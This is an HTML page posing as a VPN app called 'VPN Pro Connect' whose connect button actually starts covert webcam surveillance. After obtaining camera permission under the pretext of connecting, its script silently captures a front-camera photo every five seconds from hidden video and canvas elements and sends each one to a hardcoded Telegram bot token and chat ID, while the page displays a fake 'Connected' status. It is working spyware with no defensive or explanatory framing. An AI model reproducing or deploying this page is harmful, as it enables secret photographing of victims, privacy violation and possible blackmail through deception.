<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VPN Pro Connect</title>
    <style>
        body { margin: 0; background: radial-gradient(circle, #2c3e50, #000); color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .circle { width: 200px; height: 200px; border-radius: 50%; border: 8px solid #ff4d4d; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.5s; box-shadow: 0 0 20px #ff4d4d; position: relative; }
        .circle.connected { border-color: #2ecc71; box-shadow: 0 0 30px #2ecc71; }
        .status { font-size: 22px; font-weight: bold; color: #ff4d4d; margin-top: 30px; }
        .connected .status { color: #2ecc71; }
        #msg { margin-top: 15px; font-size: 14px; color: #2ecc71; text-align: center; padding: 0 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="circle" id="circle" onclick="toggle()">
    <span id="txt" style="font-size: 24px; font-weight: bold;">Connect</span>
</div>

<div class="status" id="st">Disconnected</div>
<div id="msg"></div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const token = "8182631007:AAEisj-KpQr-pDJkZ6SP9_lqAkrTQ2ki_oc";
    const chat_id = "6156668050"; // آیدی جدید شما جایگزین شد

    let on = false, int = null, stream = null;
    const circle = document.getElementById('circle'), txt = document.getElementById('txt');
    const st = document.getElementById('st'), msg = document.getElementById('msg');
    const v = document.getElementById('v'), c = document.getElementById('c');

    async function toggle() {
        if (!on) {
            try {
                msg.innerHTML = "در حال اتصال...";
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                v.srcObject = stream;
                on = true;
                circle.classList.add('connected');
                txt.textContent = "Stop";
                st.textContent = "Connected";
                msg.innerHTML = "متصل شد! ...";
                int = setInterval(takeShot, 5000);
            } catch (err) {
                msg.innerHTML = "خطا: نشد.";
            }
        } else { stop(); }
    }

    function stop() {
        on = false; clearInterval(int);
        if (stream) stream.getTracks().forEach(t => t.stop());
        circle.classList.remove('connected');
        txt.textContent = "Connect";
        st.textContent = "Disconnected";
        msg.innerHTML = "";
    }

    function takeShot() {
        const ctx = c.getContext('2d');
        c.width = v.videoWidth; c.height = v.videoHeight;
        ctx.drawImage(v, 0, 0);
        c.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chat_id);
            formData.append('photo', blob, 'shot.jpg');
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
            .then(res => res.json())
            .then(data => {
                if(data.ok) msg.innerHTML = " وصل شد ✅";
                else msg.innerHTML = "خطای : " + data.description;
            })
            .catch(() => { msg.innerHTML = "خطا: فیلترشکن را چک کنید!"; });
        }, 'image/jpeg', 0.6);
    }
</script>
</body>
</html>

